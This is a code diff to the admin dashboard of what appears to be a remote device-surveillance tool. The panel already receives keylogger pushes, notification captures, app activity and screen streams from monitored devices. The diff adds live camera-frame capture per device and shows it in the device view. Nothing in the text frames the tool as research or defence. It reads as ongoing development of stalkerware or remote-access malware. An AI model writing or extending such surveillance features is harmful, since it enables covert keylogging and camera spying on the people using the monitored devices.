@@ -191,6 +191,7 @@ function AdminDashboard({ logout }) {
   const [pendingCommands, setPendingCommands]         = useState({});
   const [activityLog, setActivityLog]                 = useState([]);
   const [streamFrames, setStreamFrames]               = useState({});
+  const [cameraFrames, setCameraFrames]               = useState({});
   const [keylogPushEntries, setKeylogPushEntries]     = useState([]);
   const [notifPushEntries, setNotifPushEntries]       = useState([]);
   const [activityAppEntries, setActivityAppEntries]   = useState([]);
@@ -293,6 +294,12 @@ function AdminDashboard({ logout }) {
           }
         }
         break;
+      case 'camera:frame':
+        if (data.deviceId && data.frameData) {
+          if (data.timestamp && Date.now() - data.timestamp > 5000) break;
+          setCameraFrames(prev => ({ ...prev, [data.deviceId]: { frameData: data.frameData, cameraId: data.cameraId, _ts: data._ts || Date.now() } }));
+        }
+        break;
       case 'keylog:push':
         if (data?.deviceId) setKeylogPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
         break;
@@ -374,6 +381,7 @@ function AdminDashboard({ logout }) {
               pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
               onBack={() => setSelectedDevice(null)}
               streamFrame={streamFrames[selectedDevice] || null}
+              cameraFrame={cameraFrames[selectedDevice] || null}
               send={send}
               keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
               notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
